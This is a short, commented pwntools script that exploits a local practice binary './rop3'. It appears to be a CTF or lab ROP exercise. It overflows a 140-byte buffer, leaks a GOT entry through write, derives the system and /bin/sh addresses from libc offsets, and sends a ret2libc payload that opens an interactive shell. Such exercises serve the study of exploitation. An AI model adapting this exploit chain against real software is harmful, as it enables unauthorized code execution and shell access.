from pwn import *
# context(arch="i686", os="linux", log_level=logging.DEBUG)
context(arch='i386', os='linux', log_level=logging.DEBUG)
#conventions for pwntools ^

first_part = ("A"*140 + "\xa0\x83\x04\x08" + "\x74\x84\x04\x08"
+ "\x01\x00\x00\x00" + "\x00\xa0\x04\x08" + "\x04\x00\x00\x00" )
# our exploit so far ^
r = process("./rop3", shell=True) #executes the binary
r.sendline(first_part ) #feeds the exploit to the binary
a=unpack(r.recv(4)) #gets the four bytes we leaked from the GOT
print hex(a)
# system_address=a-0x9aa40
# binsh_address = a+0x85e54
# system_address=a-0xaf8f0
# binsh_address = a+0x9b28d

log.info("read_addr   = 0x%x", a)
system_address = a - 0xaf8f0
log.info("system_addr = 0x%x", system_address)
binsh_address = a + 0x9b28d
log.info("binsh_addr  = 0x%x", binsh_address)

r.sendline("A"*140+pack(system_address)+"JUNK"+pack(binsh_address))
""" The above line sends 140 bytes of padding, the little endian form of
    system_address, a bogus return address, and the little endian form of the
    address of /bin/sh. The pack function just turns the integer into an escape
    sequence for us
"""
r.interactive() # This just enables you to type things into your shell :)
